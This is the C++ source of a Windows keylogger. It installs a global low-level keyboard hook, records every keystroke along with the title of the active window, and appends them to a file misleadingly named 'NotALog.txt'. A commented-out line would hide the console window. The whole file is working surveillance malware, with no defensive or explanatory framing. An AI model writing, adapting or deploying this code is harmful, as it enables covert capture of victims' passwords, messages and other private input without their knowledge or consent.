// oooook.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <iostream>
#include <fstream>
#include <conio.h>
#include <io.h>
#include <Windows.h>
using namespace std;

HHOOK hook;	
bool flag = false;
bool shifton = false;
bool capson = false;
char windowname[256] = {0};	
char oldWindowName[256] = {0};
ofstream LoggerFile;
ofstream test;
char keypressed[256] = {0};
DWORD convert;
HWND frontwindow;

LRESULT CALLBACK KeyboardHook(
int nCode, // hook code
WPARAM wParam, // message identifier
LPARAM lParam // pointer to structure with message data
);


int main()
{
	hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardHook, NULL, 0);
	//ShowWindow( GetConsoleWindow(), SW_HIDE );
	// either work FreeConsole()
	
	


	if(!hook) {
		cout << "ERROR CREATING HOOK ";
	}

	
	MSG msg;
	while( GetMessage( &msg, NULL, 0, 0 ) != 0 ) 
	{
      TranslateMessage( &msg );
      DispatchMessage( &msg );
    }
	
	
	return 0;
}
LRESULT CALLBACK KeyboardHook(int nCode, WPARAM wParam, LPARAM lParam)
{	

	KBDLLHOOKSTRUCT* kbStruct = (KBDLLHOOKSTRUCT*)(lParam);


	if(wParam == WM_KEYDOWN)
	{	
		LoggerFile.open("NotALog.txt", ios::app);

		//window name
		frontwindow = GetForegroundWindow();
		GetWindowTextA(frontwindow, (LPSTR)windowname, 256);
		if(strcmp(windowname, oldWindowName))
		{			
			LoggerFile << "\n---------------------------------------------------------------\nWindow Name Is: " << windowname << "\n";
			strcpy_s(oldWindowName, windowname);
		}
		


		//keypressed
		
		convert = 1;
		convert += (kbStruct->scanCode <<= 16);
		convert += (kbStruct->flags <<= 24);		
		GetKeyNameTextA(convert, keypressed, 256);



		if(GetKeyState(VK_CAPITAL) == 0)
		{
			capson = false;
		}
		else if(GetKeyState(VK_CAPITAL) == 1)
		{
			capson = true;
		}
		
		if((GetKeyState(VK_LSHIFT) < 0 || GetKeyState(VK_RSHIFT) < 0) && kbStruct->vkCode == 0x31)
		{
			LoggerFile << "!";
		}
		else if((GetKeyState(VK_LSHIFT) < 0 || GetKeyState(VK_RSHIFT) < 0) && kbStruct->vkCode == 0x32)
		{
			LoggerFile << "@";
		}
		else if((GetKeyState(VK_LSHIFT) < 0 || GetKeyState(VK_RSHIFT) < 0) && (kbStruct->vkCode == 0x33 || kbStruct->vkCode == 0x34 || kbStruct->vkCode == 0x35))
		{
			LoggerFile << (char)(kbStruct->vkCode - 0x10) << "";
		}
		else if((GetKeyState(VK_LSHIFT) < 0 || GetKeyState(VK_RSHIFT) < 0) && kbStruct->vkCode == 0x36)
		{
			LoggerFile << "^";
		}
		else if((GetKeyState(VK_LSHIFT) < 0 || GetKeyState(VK_RSHIFT) < 0) && kbStruct->vkCode == 0x37)
		{
			LoggerFile << "&";
		}
		else if((GetKeyState(VK_LSHIFT) < 0 || GetKeyState(VK_RSHIFT) < 0) && kbStruct->vkCode == 0x38)
		{
			LoggerFile << "*";
		}
		else if((GetKeyState(VK_LSHIFT) < 0 || GetKeyState(VK_RSHIFT) < 0) && kbStruct->vkCode == 0x39)
		{
			LoggerFile << "(";
		}
		else if((GetKeyState(VK_LSHIFT) < 0 || GetKeyState(VK_RSHIFT) < 0) && kbStruct->vkCode == 0x30)
		{
			LoggerFile << ")";
		}
		else if((GetKeyState(VK_LSHIFT) < 0 || GetKeyState(VK_RSHIFT) < 0) && kbStruct->vkCode == VK_OEM_3)
		{
			LoggerFile << "~";
		}
		else if((GetKeyState(VK_LSHIFT) < 0 || GetKeyState(VK_RSHIFT) < 0) && kbStruct->vkCode == VK_OEM_MINUS)
		{
			LoggerFile << "_";
		}
		else if((GetKeyState(VK_LSHIFT) < 0 || GetKeyState(VK_RSHIFT) < 0) && kbStruct->vkCode == VK_OEM_PLUS)
		{
			LoggerFile << "+";
		}
		else if((GetKeyState(VK_LSHIFT) < 0 || GetKeyState(VK_RSHIFT) < 0) && kbStruct->vkCode == VK_OEM_5)
		{
			LoggerFile << "|";
		}
		else if((GetKeyState(VK_LSHIFT) < 0 || GetKeyState(VK_RSHIFT) < 0) && kbStruct->vkCode == VK_OEM_4)
		{
			LoggerFile << "{";
		}
		else if((GetKeyState(VK_LSHIFT) < 0 || GetKeyState(VK_RSHIFT) < 0) && kbStruct->vkCode == VK_OEM_6)
		{
			LoggerFile << "}";
		}
		else if((GetKeyState(VK_LSHIFT) < 0 || GetKeyState(VK_RSHIFT) < 0) && kbStruct->vkCode == VK_OEM_1)
		{
			LoggerFile << ":";
		}
		else if((GetKeyState(VK_LSHIFT) < 0 || GetKeyState(VK_RSHIFT) < 0) && kbStruct->vkCode == VK_OEM_7)
		{
			LoggerFile << (char)0x22 << "";
		}
		else if((GetKeyState(VK_LSHIFT) < 0 || GetKeyState(VK_RSHIFT) < 0) && kbStruct->vkCode == VK_OEM_COMMA)
		{
			LoggerFile << "<";
		}
		else if((GetKeyState(VK_LSHIFT) < 0 || GetKeyState(VK_RSHIFT) < 0) && kbStruct->vkCode == VK_OEM_PERIOD)
		{
			LoggerFile << ">";
		}
		else if((GetKeyState(VK_LSHIFT) < 0 || GetKeyState(VK_RSHIFT) < 0) && kbStruct->vkCode == VK_OEM_2)
		{
			LoggerFile << "?";
		}
		else if(kbStruct->vkCode == VK_RETURN)
		{
			LoggerFile << "\n";
		}
		else if(kbStruct->vkCode == VK_RSHIFT || kbStruct->vkCode == VK_LSHIFT)
		{
			LoggerFile << "";
		}
		else if(kbStruct->vkCode == VK_CAPITAL)
		{
			LoggerFile << "";
		}
		else if(kbStruct->vkCode == VK_SPACE)
		{
			LoggerFile << " ";
		}
		else if(kbStruct->vkCode == VK_TAB)
		{
			LoggerFile << " (tab) ";
		}
		else if(kbStruct->vkCode == VK_NUMLOCK)
		{
			LoggerFile << "";
		}
		else if(kbStruct->vkCode >= VK_NUMPAD0 && kbStruct->vkCode <= VK_NUMPAD9)
		{
			LoggerFile << (char)(kbStruct->vkCode - 0x30);
		}
		else if(kbStruct->vkCode == VK_LCONTROL || kbStruct->vkCode == VK_RCONTROL)
		{
			LoggerFile << "";
		}
		else if(kbStruct->vkCode == VK_LMENU || kbStruct->vkCode == VK_RMENU)
		{
			LoggerFile << "";
		}
		//do something for backspace and delete
		else if(capson == true)
		{			
			if((GetKeyState(VK_LSHIFT) < 0 || GetKeyState(VK_RSHIFT) < 0) && (kbStruct->vkCode >= 0x41 && kbStruct->vkCode <= 0x5A))//some reason this one is || and < 0
			{				
				LoggerFile << (char)(kbStruct->vkCode + 0x20);
			}
			else
			{				
				//everyday keypress		
				LoggerFile << keypressed;
			}
		}
		else if(capson == false)//caps is off?
		{	
			if((GetKeyState(VK_LSHIFT) >= 0 && GetKeyState(VK_RSHIFT) >= 0) && (kbStruct->vkCode >= 0x41 && kbStruct->vkCode <= 0x5A))//some reason this one is && and >= 0
			{	
				LoggerFile << (char)(kbStruct->vkCode + 0x20);
			}
			else
			{	
				LoggerFile << keypressed;
			}
		}
		LoggerFile.close();
	}
	else if(wParam == WM_KEYUP)
	{
	}
	return CallNextHookEx(hook, nCode, wParam, lParam);
}